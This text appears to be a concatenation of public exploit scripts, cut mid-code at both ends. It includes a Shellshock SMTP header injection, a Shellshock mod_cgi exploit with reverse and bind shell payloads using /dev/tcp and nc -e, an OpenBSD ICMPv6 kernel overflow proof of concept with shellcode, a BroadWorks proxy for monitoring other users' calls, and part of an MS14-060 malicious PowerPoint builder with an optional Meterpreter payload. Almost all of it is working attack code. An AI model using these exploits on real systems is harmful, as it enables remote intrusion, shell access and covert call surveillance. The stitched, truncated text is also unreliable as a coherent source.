    "Date",
    "Message-ID",
    "Comments",
    "Keywords",
    "Resent-Date",
    "Resent-From",
    "Resent-Sender"
    ])

s = socket(AF_INET, SOCK_STREAM)
s.connect((rhost, rport))

# banner grab
s.recv(2048*4)

def netFormat(d):
    d += "\n"
    return d.encode('hex').decode('hex')

data = netFormat("mail from:<>")
s.send(data)
s.recv(2048*4)

data = netFormat("rcpt to:<nobody>")
s.send(data)
s.recv(2048*4)

data = netFormat("data")
s.send(data)
s.recv(2048*4)

data = ''
for h in headers:
    data += netFormat(h + ":() { :; };" + cmd)

data += netFormat(cmd)

# <CR><LF>.<CR><LF>
data += "0d0a2e0d0a".decode('hex')

s.send(data)
s.recv(2048*4)

data = netFormat("quit")
s.send(data)
s.recv(2048*4)

#! /usr/bin/env python
from socket import *
from threading import Thread
import thread, time, httplib, urllib, sys 

stop = False
proxyhost = ""
proxyport = 0

def usage():
	print """

		Shellshock apache mod_cgi remote exploit

Usage:
./exploit.py var=<value>

Vars:
rhost: victim host
rport: victim port for TCP shell binding
lhost: attacker host for TCP shell reversing
lport: attacker port for TCP shell reversing
pages:  specific cgi vulnerable pages (separated by comma)
proxy: host:port proxy

Payloads:
"reverse" (unix unversal) TCP reverse shell (Requires: rhost, lhost, lport)
"bind" (uses non-bsd netcat) TCP bind shell (Requires: rhost, rport)

Example:

./exploit.py payload=reverse rhost=1.2.3.4 lhost=5.6.7.8 lport=1234
./exploit.py payload=bind rhost=1.2.3.4 rport=1234

Credits:

Federico Galatolo 2014
"""
	sys.exit(0)

def exploit(lhost,lport,rhost,rport,payload,pages):
	headers = {"Cookie": payload, "Referer": payload}
	
	for page in pages:
		if stop:
			return
		print "[-] Trying exploit on : "+page
		if proxyhost != "":
			c = httplib.HTTPConnection(proxyhost,proxyport)
			c.request("GET","http://"+rhost+page,headers=headers)
			res = c.getresponse()
		else:
			c = httplib.HTTPConnection(rhost)
			c.request("GET",page,headers=headers)
			res = c.getresponse()
		if res.status == 404:
			print "[*] 404 on : "+page
		time.sleep(1)
		

args = {}
	
for arg in sys.argv[1:]:
	ar = arg.split("=")
	args[ar[0]] = ar[1]
try:
	args['payload']
except:
	usage()
	
if args['payload'] == 'reverse':
	try:
		lhost = args['lhost']
		lport = int(args['lport'])
		rhost = args['rhost']
		payload = "() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/"+lhost+"/"+str(lport)+" 0>&1 &"
	except:
		usage()
elif args['payload'] == 'bind':
	try:
		rhost = args['rhost']
		rport = args['rport']
		payload = "() { :;}; /bin/bash -c 'nc -l -p "+rport+" -e /bin/bash &'"
	except:
		usage()
else:
	print "[*] Unsupported payload"
	usage()
	
try:
	pages = args['pages'].split(",")
except:
	pages = ["/cgi-sys/entropysearch.cgi","/cgi-sys/defaultwebpage.cgi","/cgi-mod/index.cgi","/cgi-bin/test.cgi","/cgi-bin-sdb/printenv"]

try:
	proxyhost,proxyport = args['proxy'].split(":")
except:
	pass
			
if args['payload'] == 'reverse':
	serversocket = socket(AF_INET, SOCK_STREAM)
	buff = 1024
	addr = (lhost, lport)
	serversocket.bind(addr)
	serversocket.listen(10)
	print "[!] Started reverse shell handler" 
	thread.start_new_thread(exploit,(lhost,lport,rhost,0,payload,pages,))
if args['payload'] == 'bind':
	serversocket = socket(AF_INET, SOCK_STREAM)
	addr = (rhost,int(rport))
	thread.start_new_thread(exploit,("",0,rhost,rport,payload,pages,))
	
buff = 1024
	
while True:
	if args['payload'] == 'reverse':
		clientsocket, clientaddr = serversocket.accept()
		print "[!] Successfully exploited"
		print "[!] Incoming connection from "+clientaddr[0]
		stop = True
		clientsocket.settimeout(3)
		while True:
			reply = raw_input(clientaddr[0]+"> ")
			clientsocket.sendall(reply+"\n")
			try:
				data = clientsocket.recv(buff)
				print data
			except:
				pass
		
	if args['payload'] == 'bind':
		try:
			serversocket = socket(AF_INET, SOCK_STREAM)
			time.sleep(1)
			serversocket.connect(addr)
			print "[!] Successfully exploited"
			print "[!] Connected to "+rhost
			stop = True
			serversocket.settimeout(3)
			while True:
				reply = raw_input(rhost+"> ")
				serversocket.sendall(reply+"\n")
				data = serversocket.recv(buff)
				print data
		except:
			pass
# The PoC executes the shellcode (int 3) and returns. It overwrites the 
# ext_free() function pointer on the mbuf and forces a m_freem() on the 
# overflowed packet. 
#
# The Impacket library is used to craft and send packets 
# (http://oss.coresecurity.com/projects/impacket.html or download from 
# Debian repositories) 
#
# Currently, only systems supporting raw sockets and the PF_PACKET family 
# can run the included proof-of-concept code. 
#
# Tested against a system running "OpenBSD 4.0 CURRENT (GENERIC) Mon Oct 
# 30" 
#
# To use the code to test a custom machine you will need to: 1) Adjust the 
# MACADDRESS variable 2) Find the right trampoline value for your system 
# and replace it in the code. To find a proper trampoline value use the 
# following command: "objdump -d /bsd | grep esi | grep jmp" 3) Adjust the 
# ICMP checksum 
#
# The exploit should stop on an int 3 and pressing "c" in ddb the kernel 
# will continue normally. 
#
#
# Description:
#   OpenBSD ICMPv6 fragment remote execution PoC
#
# Author:
#   Alfredo Ortega
#   Mario Vilas
#
# Copyright (c) 2001-2007 CORE Security Technologies, CORE SDI Inc.
# All rights reserved

from impacket import ImpactPacket
import struct
import socket
import time

class BSD_ICMPv6_Remote_BO:
    MACADDRESS = (0x00,0x0c,0x29,0x44,0x68,0x6f)
    def Run(self):
        self.s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
        self.s.bind(('eth0',0x86dd))
        sourceIP = '\xfe\x80\x00\x00\x00\x00\x00\x00\x02\x0f\x29\xff\xfe\x44\x68\x6f'  # source address
        destIP   = '\xff\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01'  # destination address Multicast Link-level 
        firstFragment, secondFragment = self.buildOpenBSDPackets(sourceIP,destIP)
	validIcmp = self.buildValidICMPPacket(sourceIP,destIP)
	
	for i in range(100): # fill mbufs
        	self.sendpacket(firstFragment)
		self.sendpacket(validIcmp)
		time.sleep(0.01)
	for i in range(2): # Number of overflow packets to send. Increase if exploit is not reliable
        	self.sendpacket(secondFragment)
		time.sleep(0.1)
        	self.sendpacket(firstFragment)
		self.sendpacket(validIcmp)
		time.sleep(0.1)

    def sendpacket(self, data):
        ipe = ImpactPacket.Ethernet()
        ipe.set_ether_dhost(self.MACADDRESS)
        ipd = ImpactPacket.Data(data)
        ipd.ethertype = 0x86dd  # Ethertype for IPv6
        ipe.contains(ipd)
        p = ipe.get_packet()
        self.s.send(p)

    def buildOpenBSDPackets(self,sourceIP,destIP):
        HopByHopLenght= 1

        IPv6FragmentationHeader = ''
        IPv6FragmentationHeader += struct.pack('!B', 0x3a)  # next header (00: Hop by Hop)
        IPv6FragmentationHeader += struct.pack('!B', 0x00)  # reserverd
        IPv6FragmentationHeader += struct.pack('!B', 0x00)  # offset
        IPv6FragmentationHeader += struct.pack('!B', 0x01)  # offset + More fragments: yes
        IPv6FragmentationHeader += struct.pack('>L', 0x0EADBABE) # id

        IPv6HopByHopHeader  = ''
        IPv6HopByHopHeader += struct.pack('!B', 0x2c)                    # next header (0x3A: ICMP)
        IPv6HopByHopHeader += struct.pack('!B', HopByHopLenght )         # Hdr Ext Len (frutaaaaaaa :D )
        IPv6HopByHopHeader += '\x00' *(((HopByHopLenght+1)*8)-2)         # Options

        longitud = len(IPv6HopByHopHeader)+len(IPv6FragmentationHeader)
	print longitud
        IPv6Packet  = ''
        IPv6Packet += struct.pack( '>L', 6 << 28 )      # version, traffic class, flow label
        IPv6Packet += struct.pack( '>H', longitud )     # payload length
        IPv6Packet += '\x00'                            # next header (2c: Fragmentation)
        IPv6Packet += '\x40'                            # hop limit

        IPv6Packet += sourceIP
        IPv6Packet += destIP

        firstFragment = IPv6Packet+IPv6HopByHopHeader+IPv6FragmentationHeader+('O'*150)

	self.ShellCode =  ''
        self.ShellCode += '\xcc' # int 3
	self.ShellCode += '\x83\xc4\x20\x5b\x5e\x5f\xc9\xc3\xcc' #fix ESP and ret

        ICMPv6Packet  = ''
        ICMPv6Packet += '\x80'  # type (128 == Icmp echo request)
        ICMPv6Packet += '\x00'  # code
        ICMPv6Packet += '\xfb\x4e'  # checksum
        ICMPv6Packet += '\x33\xf6'  # ID
        ICMPv6Packet += '\x00\x00'  # sequence
        ICMPv6Packet +=  ('\x90'*(212-len(self.ShellCode)))+self.ShellCode
	# Start of the next mfub (we land here):
	ICMPv6Packet += '\x90\x90\x90\x90\xE9\x3B\xFF\xFF' # jump backwards
        ICMPv6Packet += '\xFFAAA\x01\x01\x01\x01AAAABBBBAAAABBBB' 
	# mbuf+0x20:
	trampoline = '\x8c\x23\x20\xd0' # jmp ESI on /bsd (find with "objdump -d /bsd | grep esi | grep jmp")
        ICMPv6Packet += 'AAAAAAAA'+trampoline+'CCCCDDDDEEEEFFFFGGGG' 
        longitud = len(ICMPv6Packet)


	IPv6Packet  = ''
        IPv6Packet += struct.pack( '>L', 6 << 28 )      # version, traffic class, flow label
        IPv6Packet += struct.pack( '>H', longitud )     # payload length
        IPv6Packet += '\x2c'                            # next header (2c: Fragmentation)
        IPv6Packet += '\x40'                            # hop limit
        IPv6Packet += sourceIP
        IPv6Packet += destIP

        IPv6FragmentationHeader = ''
        IPv6FragmentationHeader += struct.pack('!B', 0x3a)  # next header (3A: icmpV6)
        IPv6FragmentationHeader += struct.pack('!B', 0x00)  # reserverd
        IPv6FragmentationHeader += struct.pack('!B', 0x00)  # offset
        IPv6FragmentationHeader += struct.pack('!B', 0x00)  # offset + More fragments:no
        IPv6FragmentationHeader += struct.pack('>L', 0x0EADBABE) # id

        secondFragment = IPv6Packet+IPv6FragmentationHeader+ICMPv6Packet

        return firstFragment, secondFragment



    def buildValidICMPPacket(self,sourceIP,destIP):

        ICMPv6Packet  = ''
        ICMPv6Packet += '\x80'  # type (128 == Icmp echo request)
        ICMPv6Packet += '\x00'  # code
        ICMPv6Packet += '\xcb\xc4'  # checksum
        ICMPv6Packet += '\x33\xf6'  # ID
        ICMPv6Packet += '\x00\x00'  # sequence
	ICMPv6Packet += 'T'*1232

        longitud = len(ICMPv6Packet)

        IPv6Packet  = ''
        IPv6Packet += struct.pack( '>L', 6 << 28 )      # version, traffic class, flow label
        IPv6Packet += struct.pack( '>H', longitud )     # payload length
        IPv6Packet += '\x3A'                            # next header (2c: Fragmentation)
        IPv6Packet += '\x40'                            # hop limit
        IPv6Packet += sourceIP
        IPv6Packet += destIP

        icmpPacket = IPv6Packet+ICMPv6Packet

        return  icmpPacket

attack = BSD_ICMPv6_Remote_BO()
attack.Run()

# milw0rm.com [2007-03-15]
source: http://www.securityfocus.com/bid/44597/info

BroadWorks is prone to a security-bypass vulnerability.

An attacker can exploit this issue to bypass certain security restrictions and to obtain sensitive information. Successful exploits will enable the attacker to monitor the incoming and outgoing calls of users in other enterprise groups.

BroadWorks versions R16 and prior are vulnerable.

#!/usr/env/python
# Nick Freeman | vt  [ nick.freeman@security-assessment.com ] May 2k10

# When running the proxy, each request prompts for k, m, i or your input:
#
# K/Enter - forwards the packet
# m 	  - automodifies the packet (see changeme and automod variables)
# i 	  - prompts for a file containing usernames in the 098765@sp.com format
# input	  - sends your raw input (i.e., paste an XML message in there)
#
# When you're auth'd and ready to monitor other users, generate a packet to BroadWorks (address book update for example), select 'i' and specify a file with usernames in it.

import socket, ssl, sys, re, time
from xml.dom import minidom


# define local listening ip, port
lhost = '127.0.0.1'
lport = 1111

# define dest host, port, and domain
dhost = ''
dport = 1111
ddomregex = '@serviceprovider\.com.*' # SP's domain name, only regexd

# define automod
changeme = 'CallClient' # the string to automagically change
tothis = 'AttendantConsole' # what you want it to automagically change to

# define injection params
userUid = '' # userUid of YOUR user (with AttendantConsole privs)
applicationId = 'Client License 4'
monitorpacket = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><BroadsoftDocument protocol="CAP" version="14.0"><command commandType="monitoringUsersRequest"><commandData><user 
userType="AttendantConsole" userUid="' + userUid + '"><applicationId>'  + applicationId + '</applicationId><monitoring monType="Add"/>QQQQ</user></commandData></command></BroadsoftDocument>'
monUserLine = '<monUser>ZZ</monUser>'

# define logfile
logfile = 'call-logs.txt'

# the listener
ls = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ls.bind((lhost, lport))
print "+ Bound to port " + `lport`
ls.listen(1)
print "+ Listening..\n"

# the sender
ds = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sds = ssl.wrap_socket(ds)

# start listening
lconn, addr = ls.accept()
print '+ Connected by', addr

# connect to remote host
sds.connect((dhost, dport))
print '+ Connected to remote host'

def local_packetgrab():
	ldata = ""
	lconn.settimeout(1)
	try:
		ldata = lconn.recv(2048)
		if len(ldata) < 5:
			return 'nodata'
		# debug
		#print ">>>>>>>>>>>>>>>>>>>>>>>>>>\n"
		#print "Received data from client:\n"
		#print ">>>>>>>>>>>>>>>>>>>>>>>>>>\n"
		#print ldata
		# We have received some data, lets check if its finished or not
		while 1:
		    line = ""
		    try:
			line = lconn.recv(2048)
			# debug
			#print ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n"
			#print "Received more data from client:\n"
			#print ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n"
			#print line
			ldata += line
		    except socket.timeout:
			# debug
			#print "No additional data received."
			break

		    # possibly not necessary
	            if line == "":
        	        break

	except socket.timeout:
		# No data received from client
		return 'nodata'
	
	if len(ldata) > 5:
		print ">>>>>>>>>>>>>>>>>\n"
		print "Data from client:\n"
		print ">>>>>>>>>>>>>>>>>\n"
		print ldata 
		return ldata
	else:
		# No data received from client
		return 'nodata'


def remote_packetgrab():
	ddata = ""
	sds.settimeout(1)
	try:
		ddata = sds.recv(2048)
		# debug
		#print "<<<<<<<<<<<<<<<<<<<<<<<<<<\n"
		#print "Received data from server:\n"
		#print "<<<<<<<<<<<<<<<<<<<<<<<<<<\n"
		#print ddata
		# We have received from data, lets check if its finished or not
		while 1:
			dline = ""
			try:
				dline = sds.recv(2048)
				# debug
				#print "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<\n"
				#print "Received more data from server:\n"
				#print "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<\n"
				#print dline
				ddata += dline
			except:
				# debug
				#print "No additional data received.\n"
				break

	except:
		# No data received from server
		return 'nodata'

	if len(ddata) > 5:
		print "<<<<<<<<<<<<<<<<<\n"
		print "Data from server:\n"
		print "<<<<<<<<<<<<<<<<<\n"
		print ddata

		# do CDR grab

		if re.search('callUpdate', ddata):
			logme = open(logfile, 'a')
			# it be a call packet
			xmldoc = minidom.parseString(ddata)
			if re.search('remoteTelUri', ddata):
			   if re.search('\<state\>2', ddata):
				# it be an incoming call
				callTo = xmldoc.getElementsByTagName('monitoredUserId')[0].toxml()
				callTo = re.sub('\<monitoredUserId\>', '', callTo)
				callTo = re.sub(ddomregex, '', callTo)


				callFrom = xmldoc.getElementsByTagName('remoteTelUri')[0].toxml()
				callFrom = re.sub('\<remoteTelUri\>tel\:', '', callFrom)
				callFrom = re.sub('\<\/remote.*', '', callFrom)				
				localtime = time.asctime( time.localtime(time.time()) )
				logstring = "[" + localtime + "]: Incoming call to " + callTo + " from " + callFrom + "!\n"
				logme.write(logstring)
				print logstring
				logme.close()
			else:
			   if re.search('\<state\>2', ddata):
				# it be an outgoing call
				callFrom = xmldoc.getElementsByTagName('monitoredUserId')[0].toxml()
				callFrom = re.sub('\<monitoredUserId\>', '', callFrom)
				callFrom = re.sub(ddomregex, '', callFrom)


				callTo = xmldoc.getElementsByTagName('remoteNumber')[0].toxml()
				callTo = re.sub('\<remoteNumber\>', '', callTo)
				callTo = re.sub('\<\/remote.*', '', callTo)				

				localtime = time.asctime( time.localtime(time.time()) )
				logstring = "[" + localtime + "]: Outgoing call from " + callFrom + " to " + callTo + "!\n"
				logme.write(logstring)
				print logstring
				logme.close()


		return ddata
	else:
		# No data received from server
		return 'nodata'


def packet_handle(packet):
	user_input = raw_input("ACTION: 'k', 'm', 'i' or your input:\n-------------------------------\n")
	if user_input == 'k' or user_input == '':
		print "Sending request as is..\n"
		print "-----------------------\n"
		return packet
	elif user_input == 'm':
		print "Sending auto-modded request..\n"
		print "-----------------------------\n"
		packet = re.sub(changeme, tothis, packet)
		return packet
	elif user_input == "i":
		filename = raw_input("Input file containing usernames:\n--------------------------------\n");
		try:
			file = open(filename, 'r')
		except: 
			filename = raw_input("File does not exist. Try again:\n-------------------------------\n")
		file_line = 0

		injection_input = ''
		for each_line in file:
			print "Read line: " + each_line
			mond_user = re.sub('ZZ', each_line, monUserLine)
			injection_input = injection_input + mond_user
			file_line = file_line + 1
			if file_line >= 100:
				evilpacket = re.sub('QQQQ', injection_input, monitorpacket)
				print "Sending injection packet.."
				print "--------------------------\n"
				evilpacket = re.sub('\n', '', evilpacket)
				print evilpacket
				sds.send(evilpacket)
				file_line = 0
						

		# we have now got 100 users to add. send the packet, then continue sorting through users.			
		if len(injection_input) > 10:
			evilpacket = re.sub('QQQQ', injection_input, monitorpacket)
			print "Sending injection packet.."
			print "--------------------------\n"
			evilpacket = re.sub('\n', '', evilpacket)
			print evilpacket
			sds.send(evilpacket)
		
		# after all injection is done, return initial packet
		file.close()
		return packet

	else:
		print "Sending modified packet..\n"
		print "-------------------------\n"
		return user_input
	



while 1:
	# Debug
	#print "Checking for client packet..\n"
	print ">"
	local_data = local_packetgrab()
	if local_data != 'nodata' and len(local_data) > 5:
		lpacket_tosend = packet_handle(local_data)
		sds.send(lpacket_tosend)

	# Debug
	#print "Checking for server packet..\n"
	print "<"
	remote_data = remote_packetgrab()
	if remote_data != 'nodata' and len(remote_data) > 5:
		rpacket_tosend = packet_handle(remote_data)
		lconn.send(rpacket_tosend)
# !/usr/bin/python
# Windows OLE RCE Exploit MS14-060 (CVE-2014-4114)  Sandworm
# Author: Mike Czumak (T_v3rn1x) - @SecuritySift
# Written: 10/21/2014
# Tested Platform(s): Windows 7 SP1 (w/ exploit script run on Kali Linux)
# You are free to reuse this code in part or in whole with the exception of commercial applications
# For a demo of this PoC, see http://www.securitysift.com/windows-ole-rce-exploit-ms14-060/

import sys, os
import zipfile
import argparse
import subprocess
from shutil import copyfile
from pptx import Presentation 
 
# Args/Usage  
def get_args():
 
    parser = argparse.ArgumentParser( prog="ms14_060.py",
                                      formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50),
                                      epilog= '''This script will build a blank PowerPoint show (ppsx) file to exploit the
                                      OLE Remote Code Execution vulnerability identified as MS14-060 (CVE-2014-4114)
				                          Simply pass filename of resulting PPSX and IP Address of remote machine hosting the
				                          share. You can add content to the PPSX file after it has been created. 
                                      The script will also create the INF file and an optional Meterpreter
				                          reverse_tcp executable with the -m switch. Alternatively, you can host your own exectuble payload. 
                                      Host the INF and GIF (EXE) in an SMB share called "share".
                                      Note: Requires python-pptx''')
 
    parser.add_argument("filename", help="Name of resulting PPSX exploit file")
    parser.add_argument("ip", help="IP Address of Remote machine hosting the share")
    parser.add_argument("-m", "--msf", help="Set if you want to create Meterpreter gif executable. Pass port (uses ip arg)")
    args = parser.parse_args()
 
    return args
 
 
# write file
def write_file(filename, contents):
    f = open(filename, "w")
    f.write(contents)
    f.close()
 
# build bin
def build_bin(embed, ip, share, file): 
 
    bin = "\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1" # ole header
    bin = bin + "\x00" * 16 
    bin = bin + "\x3E\x00\x03\x00\xFE\xFF\x09\x00"
    bin = bin + "\x06\x00\x00\x00\x00\x00\x00\x00"
    bin = bin + "\x00\x00\x00\x00\x01\x00\x00\x00"
    bin = bin + "\x01\x00\x00\x00\x00\x00\x00\x00"
    bin = bin + "\x00\x10\x00\x00\x02\x00\x00\x00"
    bin = bin + "\x01\x00\x00\x00\xFE\xFF\xFF\xFF"
    bin = bin + "\x00\x00\x00\x00\x00\x00\x00\x00"
    bin = bin + "\xFF" * 432
    bin = bin + "\xFD\xFF\xFF\xFF\xFE\xFF\xFF\xFF"
    bin = bin + "\xFE\xFF\xFF\xFF\xFE\xFF\xFF\xFF"
    bin = bin + "\xFF" * 496
    bin = bin + "\x52\x00\x6F\x00\x6F\x00\x74\x00"
    bin = bin + "\x20\x00\x45\x00\x6E\x00\x74\x00"
    bin = bin + "\x72\x00\x79\x00\x00\x00\x00\x00"
    bin = bin + "\x00" * 40
    bin = bin + "\x16\x00\x05\x00\xFF\xFF\xFF\xFF"
    bin = bin + "\xFF\xFF\xFF\xFF\x01\x00\x00\x00"
    bin = bin + "\x02\x26\x02\x00\x00\x00\x00\x00"
    bin = bin + "\xC0\x00\x00\x00\x00\x00\x00\x46"
    bin = bin + "\x00" * 12
    bin = bin + "\xF0\x75\xFD\x41\x63\xB2\xCF\x01"
    bin = bin + "\x03\x00\x00\x00\x40\x00\x00\x00"
    bin = bin + "\x00\x00\x00\x00\x01\x00\x4F\x00"
    bin = bin + "\x4C\x00\x45\x00\x31\x00\x30\x00"
    bin = bin + "\x4E\x00\x61\x00\x74\x00\x69\x00"
    bin = bin + "\x76\x00\x65\x00\x00\x00\x00\x00"
    bin = bin + "\x00" * 36
    bin = bin + "\x1A\x00\x02\x01"
    bin = bin + "\xFF" * 12
    bin = bin + "\x00" * 40
    bin = bin + "\x37"
    bin = bin + "\x00" * 75
    bin = bin + "\xFF" * 12
    bin = bin + "\x00" * 116
    bin = bin + "\xFF" * 12
    bin = bin + "\x00" * 48
    bin = bin + "\xFE"
    bin = bin + "\xFF" * 511
    bin = bin + "\x33\x00\x00\x00" + embed + "\x00" # 3   EmbeddedStgX.txt 
    bin = bin + "\x5C\x5C" + ip + "\x5C" + share + "\x5C" + file # \\ip\share\file    
    bin = bin + "\x00" * 460
    return bin

# build ppt/drawings/vmlDrawing1.vml	
def build_vml():
    xml = '<xml xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:p="urn:schemas-microsoft-com:office:powerpoint" xmlns:oa="urn:schemas-microsoft-com:office:activation">'
    xml = xml + '<o:shapelayout v:ext="edit"><o:idmap v:ext="edit" data="1"/></o:shapelayout><v:shapetype id="_x0000_t75" coordsize="21600,21600" o:spt="75" o:preferrelative="t" path="m@4@5l@4@11@9@11@9@5xe" filled="f" stroked="f">'
    xml = xml + '<v:stroke joinstyle="miter"/><v:formulas><v:f eqn="if lineDrawn pixelLineWidth 0"/><v:f eqn="sum @0 1 0"/><v:f eqn="sum 0 0 @1"/><v:f eqn="prod @2 1 2"/><v:f eqn="prod @3 21600 pixelWidth"/><v:f eqn="prod @3 21600 pixelHeight"/><v:f eqn="sum @0 0 1"/>'
    xml = xml + '<v:f eqn="prod @6 1 2"/><v:f eqn="prod @7 21600 pixelWidth"/><v:f eqn="sum @8 21600 0"/><v:f eqn="prod @7 21600 pixelHeight"/><v:f eqn="sum @10 21600 0"/></v:formulas>'
    xml = xml + '<v:path o:extrusionok="f" gradientshapeok="t" o:connecttype="rect"/><o:lock v:ext="edit" aspectratio="t"/></v:shapetype><v:shape id="_x0000_s1026" type="#_x0000_t75" style="position:absolute; left:100pt;top:-100pt;width:30pt;height:30pt"><v:imagedata o:relid="rId1" o:title=""/></v:shape><v:shape id="_x0000_s1027" type="#_x0000_t75" style="position:absolute; left:150pt;top:-100pt;width:30pt;height:30pt">'
    xml = xml + '<v:imagedata o:relid="rId2" o:title=""/></v:shape></xml>'
    return xml
 
 # build ppt/slides/_rels/slide1.xml.rels
def build_xml_rels(ole1, ole2):
    xml = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    xml = xml + '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="../embeddings/' + ole1 + '"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="../embeddings/' + ole2 + '"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout1.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/vmlDrawing" Target="../drawings/vmlDrawing1.vml"/></Relationships>'  
    return xml
 
def build_xml_slide1():
    xml = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    xml = xml + '<p:sld xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"><p:cSld><p:spTree><p:nvGrpSpPr><p:cNvPr id="1" name=""/><p:cNvGrpSpPr/><p:nvPr/></p:nvGrpSpPr><p:grpSpPr><a:xfrm><a:off x="0" y="0"/><a:ext cx="0" cy="0"/><a:chOff x="0" y="0"/><a:chExt cx="0" cy="0"/></a:xfrm></p:grpSpPr><p:graphicFrame><p:nvGraphicFramePr><p:cNvPr id="4" name="Object 3"/><p:cNvGraphicFramePr><a:graphicFrameLocks noChangeAspect="1"/></p:cNvGraphicFramePr><p:nvPr/></p:nvGraphicFramePr><p:xfrm><a:off x="1270000" y="-1270000"/><a:ext cx="381000" cy="381000"/></p:xfrm><a:graphic><a:graphicData uri="http://schemas.openxmlformats.org/presentationml/2006/ole"><p:oleObj spid="_x0000_s1026" name="Packager Shell Object" r:id="rId3" imgW="850320" imgH="686880" progId=""><p:embed/></p:oleObj></a:graphicData></a:graphic></p:graphicFrame><p:graphicFrame><p:nvGraphicFramePr><p:cNvPr id="5" name="Object 4"/><p:cNvGraphicFramePr><a:graphicFrameLocks noChangeAspect="1"/></p:cNvGraphicFramePr><p:nvPr/></p:nvGraphicFramePr><p:xfrm><a:off x="1905000" y="-1270000"/><a:ext cx="381000" cy="381000"/></p:xfrm><a:graphic><a:graphicData uri="http://schemas.openxmlformats.org/presentationml/2006/ole"><p:oleObj spid="_x0000_s1027" name="Packager Shell Object" r:id="rId4" imgW="850320" imgH="686880" progId=""><p:embed/></p:oleObj></a:graphicData></a:graphic></p:graphicFrame></p:spTree></p:cSld><p:clrMapOvr><a:masterClrMapping/></p:clrMapOvr><p:transition><p:zoom/></p:transition><p:timing><p:tnLst><p:par><p:cTn id="1" dur="indefinite" restart="never" nodeType="tmRoot"><p:childTnLst><p:seq concurrent="1" nextAc="seek"><p:cTn id="2" dur="indefinite" nodeType="mainSeq"><p:childTnLst><p:par><p:cTn id="3" fill="hold"><p:stCondLst><p:cond delay="indefinite"/><p:cond evt="onBegin" delay="0"><p:tn val="2"/></p:cond></p:stCondLst><p:childTnLst><p:par><p:cTn id="4" fill="hold"><p:stCondLst><p:cond delay="0"/></p:stCondLst><p:childTnLst><p:par><p:cTn id="5" presetID="11" presetClass="entr" presetSubtype="0" fill="hold" nodeType="withEffect"><p:stCondLst><p:cond delay="0"/></p:stCondLst><p:childTnLst><p:set><p:cBhvr><p:cTn id="6" dur="1000"><p:stCondLst><p:cond delay="0"/></p:stCondLst></p:cTn><p:tgtEl><p:spTgt spid="4"/></p:tgtEl><p:attrNameLst><p:attrName>style.visibility</p:attrName></p:attrNameLst></p:cBhvr><p:to><p:strVal val="visible"/></p:to></p:set></p:childTnLst></p:cTn></p:par></p:childTnLst></p:cTn></p:par><p:par><p:cTn id="7" fill="hold"><p:stCondLst><p:cond delay="1000"/></p:stCondLst><p:childTnLst><p:par><p:cTn id="8" presetID="11" presetClass="entr" presetSubtype="0" fill="hold" nodeType="afterEffect"><p:stCondLst><p:cond delay="0"/></p:stCondLst><p:childTnLst><p:set><p:cBhvr><p:cTn id="9" dur="1000"><p:stCondLst><p:cond delay="0"/></p:stCondLst></p:cTn><p:tgtEl><p:spTgt spid="4"/></p:tgtEl><p:attrNameLst><p:attrName>style.visibility</p:attrName></p:attrNameLst></p:cBhvr><p:to><p:strVal val="visible"/></p:to></p:set><p:cmd type="verb" cmd="-3"><p:cBhvr><p:cTn id="10" dur="1000" fill="hold"><p:stCondLst><p:cond delay="0"/></p:stCondLst></p:cTn><p:tgtEl><p:spTgt spid="4"/></p:tgtEl></p:cBhvr></p:cmd></p:childTnLst></p:cTn></p:par></p:childTnLst></p:cTn></p:par><p:par><p:cTn id="11" fill="hold"><p:stCondLst><p:cond delay="2000"/></p:stCondLst><p:childTnLst><p:par><p:cTn id="12" presetID="11" presetClass="entr" presetSubtype="0" fill="hold" nodeType="afterEffect"><p:stCondLst><p:cond delay="0"/></p:stCondLst><p:childTnLst><p:set><p:cBhvr><p:cTn id="13" dur="1000"><p:stCondLst><p:cond delay="0"/></p:stCondLst></p:cTn><p:tgtEl><p:spTgt spid="5"/></p:tgtEl><p:attrNameLst><p:attrName>style.visibility</p:attrName></p:attrNameLst></p:cBhvr><p:to><p:strVal val="visible"/></p:to></p:set><p:cmd type="verb" cmd="3"><p:cBhvr><p:cTn id="14" dur="1000" fill="hold"><p:stCondLst><p:cond delay="0"/></p:stCondLst></p:cTn><p:tgtEl><p:spTgt spid="5"/></p:tgtEl></p:cBhvr></p:cmd></p:childTnLst></p:cTn></p:par></p:childTnLst></p:cTn></p:par></p:childTnLst></p:cTn></p:par></p:childTnLst></p:cTn><p:prevCondLst><p:cond evt="onPrev" delay="0"><p:tgtEl><p:sldTgt/></p:tgtEl></p:cond></p:prevCondLst><p:nextCondLst><p:cond evt="onNext" delay="0"><p:tgtEl><p:sldTgt/></p:tgtEl></p:cond></p:nextCondLst></p:seq></p:childTnLst></p:cTn></p:par></p:tnLst></p:timing></p:sld>'
    return xml

# build [Content_Types].xml	
def build_xml_content_types():
    xml = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
